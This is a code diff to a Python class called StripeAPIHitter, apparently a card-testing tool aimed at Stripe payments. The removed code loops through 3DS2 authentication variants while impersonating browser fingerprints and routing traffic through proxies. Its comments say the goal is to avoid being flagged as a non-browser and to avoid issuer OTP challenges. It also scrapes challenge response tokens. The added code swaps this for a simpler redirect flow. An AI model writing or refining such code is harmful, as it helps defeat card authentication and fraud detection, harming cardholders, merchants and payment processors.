@@ -1831,157 +1831,18 @@ class StripeAPIHitter:
                                 )
                                 processed_auth = False
 
-                                if is_legacy_3ds:
-                                    redirect_url = confirm_json.get("url") or sdk.get("stripe_js") or next_action.get("redirect_to_url", {}).get("url")
-                                    if isinstance(redirect_url, str):
+                                if is_legacy_3ds or source:
+                                    # APP (3).PY DIRECT REDIRECT FLOW
+                                    redirect_url = confirm_json.get("url") or sdk.get("stripe_js") or (next_action.get("redirect_to_url") or {}).get("url")
+                                    if isinstance(redirect_url, str) and redirect_url:
                                         redir_headers = {
                                             "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                                             "user-agent": profile["user_agent"]
                                         }
-                                        await loop.run_in_executor(None, lambda: cffi_requests.get(redirect_url, headers=redir_headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
-                                    state = "redirected"
-                                    processed_auth = True
-                                elif source:
-                                    # Multi-variation 3DS2 frictionless authenticate loop
-                                    auth_headers = {
-                                        "accept": "application/json",
-                                        "content-type": "application/x-www-form-urlencoded",
-                                        "origin": "https://js.stripe.com",
-                                        "referer": "https://js.stripe.com/",
-                                        "user-agent": profile["user_agent"]
-                                    }
-                                    if self.stripe_account:
-                                        auth_headers["Stripe-Account"] = self.stripe_account
-                                    
-                                    # Extract threeDSServerTransID from the source object if available
-                                    # Real Stripe.js always forwards this from the 3DS2 source — missing it flags non-browser
-                                    _tds_server_trans_id = None
-                                    _source_obj = sdk.get("three_d_secure_2_source_object") or {}
-                                    if isinstance(_source_obj, dict):
-                                        _tds_server_trans_id = _source_obj.get("three_d_secure_2", {}).get("three_d_secure_server_transaction_id")
-                                    if not _tds_server_trans_id:
-                                        _tds_server_trans_id = sdk.get("server_transaction_id") or sdk.get("three_ds_server_trans_id")
-
-                                    # Execute 3DS2 Method Notification POST to ACS method URL if present
-                                    # Real Stripe.js executes this hidden iframe POST before calling /v1/3ds2/authenticate.
-                                    # Skipping it causes ACS (e.g., wlp-acs.com) to force OTP challenge.
-                                    _method_url = sdk.get("three_ds_method_url")
-                                    if _method_url and _tds_server_trans_id:
                                         try:
-                                            import base64 as _b64
-                                            _m_data = json.dumps({
-                                                "threeDSServerTransID": _tds_server_trans_id,
-                                                "threeDSMethodNotificationURL": "https://hooks.stripe.com/3ds2/method_response"
-                                            }).encode()
-                                            _m_b64 = _b64.b64encode(_m_data).decode().rstrip('=').replace('+', '-').replace('/', '_')
-                                            _m_headers = {
-                                                "content-type": "application/x-www-form-urlencoded",
-                                                "user-agent": profile["user_agent"]
-                                            }
-                                            await loop.run_in_executor(None, lambda: cffi_requests.post(
-                                                _method_url, data={"threeDSMethodData": _m_b64},
-                                                headers=_m_headers, proxies=proxies, timeout=10,
-                                                impersonate=profile["impersonate"]))
+                                            await loop.run_in_executor(None, lambda: cffi_requests.get(redirect_url, headers=redir_headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                                         except Exception:
                                             pass
-
-                                    auth_variations = [
-                                        {"threeDSCompInd": "Y", "threeDSRequestorChallengeInd": "01", "fingerprintAttempted": True},
-                                        {"threeDSCompInd": "Y", "threeDSRequestorChallengeInd": "04", "fingerprintAttempted": True},
-                                        {"threeDSCompInd": "Y", "threeDSRequestorChallengeInd": "05", "fingerprintAttempted": True},
-                                        {"threeDSCompInd": "Y", "threeDSRequestorChallengeInd": "02", "fingerprintAttempted": True},
-                                        {"threeDSCompInd": "U", "threeDSRequestorChallengeInd": "01", "fingerprintAttempted": True},
-                                        {"threeDSCompInd": "N", "threeDSRequestorChallengeInd": "03", "fingerprintAttempted": False}
-                                    ]
-                                    
-                                    auth_json = {}
-                                    state = None
-                                    for var in auth_variations:
-                                        browser = {
-                                            "fingerprintAttempted": var["fingerprintAttempted"],
-                                            "fingerprintData": None,
-                                            "challengeWindowSize": "05",
-                                            "threeDSCompInd": var["threeDSCompInd"],
-                                            "threeDSRequestorChallengeInd": var["threeDSRequestorChallengeInd"],
-                                            "browserJavaEnabled": False,
-                                            "browserJavascriptEnabled": True,
-                                            "browserLanguage": locale,
-                                            "browserColorDepth": profile.get("color_depth", "24"),
-                                            "browserScreenHeight": profile.get("screen_height", "1080"),
-                                            "browserScreenWidth": profile.get("screen_width", "1920"),
-                                            "browserTZ": str(tz_id) if isinstance(tz_id, int) else "-300",
-                                            "browserUserAgent": auth_headers["user-agent"]
-                                        }
-                                        auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
-                                        auth_data = {
-                                            "source": source,
-                                            "browser": json.dumps(browser),
-                                            "threeDSCompInd": var["threeDSCompInd"],
-                                            "one_click_authn_device_support[hosted]": "false",
-                                            "one_click_authn_device_support[same_origin_frame]": "false",
-                                            "one_click_authn_device_support[spc_eligible]": "false",
-                                            "one_click_authn_device_support[webauthn_eligible]": "false",
-                                            "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
-                                            "key": pk
-                                        }
-                                        # Forward threeDSServerTransID if extracted — session continuity signal
-                                        if _tds_server_trans_id:
-                                            auth_data["three_ds_server_trans_id"] = _tds_server_trans_id
-                                        try:
-                                            auth_resp_raw = await loop.run_in_executor(None, lambda data=auth_data: cffi_requests.post(
-                                                auth_url, headers=auth_headers, data=data,
-                                                proxies=proxies, timeout=25, impersonate=profile["impersonate"]))
-                                            auth_json = auth_resp_raw.json()
-                                            state = auth_json.get("state")
-                                            print(f"[DEBUG 3DS] var={var} state={state} ares={auth_json.get('ares',{}).get('transStatus')} acsURL={bool(auth_json.get('ares',{}).get('acsURL'))} cReq={bool(auth_json.get('ares',{}).get('cReq'))}")
-                                            if state in ["succeeded", "authenticated"]:
-                                                break
-                                            
-                                            # Parse transStatus from ARes — 'A' (attempted) counts as frictionless success
-                                            ares = auth_json.get("ares", {}) or {}
-                                            trans_status = ares.get("transStatus")
-                                            if trans_status in ["Y", "A"]:
-                                                # Y = fully authenticated, A = attempted (issuer ACS unreachable but attempt proven)
-                                                state = "authenticated"
-                                                break
-                                                
-                                            # Handle ACS Challenge verification
-                                            acs_url = ares.get("acsURL") or auth_json.get("acs_url")
-                                            creq = ares.get("cReq") or auth_json.get("creq")
-                                            
-                                            if acs_url and creq:
-                                                try:
-                                                    acs_headers = {
-                                                        "User-Agent": profile["user_agent"],
-                                                        "Content-Type": "application/x-www-form-urlencoded"
-                                                    }
-                                                    acs_resp = await loop.run_in_executor(None, lambda: cffi_requests.post(
-                                                        acs_url, data={"creq": creq}, headers=acs_headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
-                                                    
-                                                    # Only notify challenge/complete if the challenge was answered or returned a response
-                                                    comp_url = "https://api.stripe.com/v1/3ds2/challenge/complete"
-                                                    comp_data = {"source": source, "key": pk}
-                                                    
-                                                    # Check if ACS returned a cres token in HTML/JSON body
-                                                    if acs_resp and acs_resp.status_code == 200:
-                                                        import re as _re_cres
-                                                        cres_match = _re_cres.search(r'name=["\']cres["\']\s+value=["\']([^"\']+)["\']', acs_resp.text, _re_cres.I)
-                                                        if cres_match:
-                                                            comp_data["cres"] = cres_match.group(1)
-                                                        
-                                                        await loop.run_in_executor(None, lambda: cffi_requests.post(
-                                                            comp_url, data=comp_data, headers=auth_headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
-                                                except Exception:
-                                                    pass
-                                            
-                                            # transStatus N/R = hard denied by issuer, stop looping
-                                            if trans_status in ["N", "R"]:
-                                                break
-                                                
-                                            if state in ["succeeded", "authenticated", "challenge_required"]:
-                                                break
-                                        except Exception:
-                                            continue
                                     processed_auth = True
                                 else:
                                     result['decline_code'] = 'no_3ds_source'
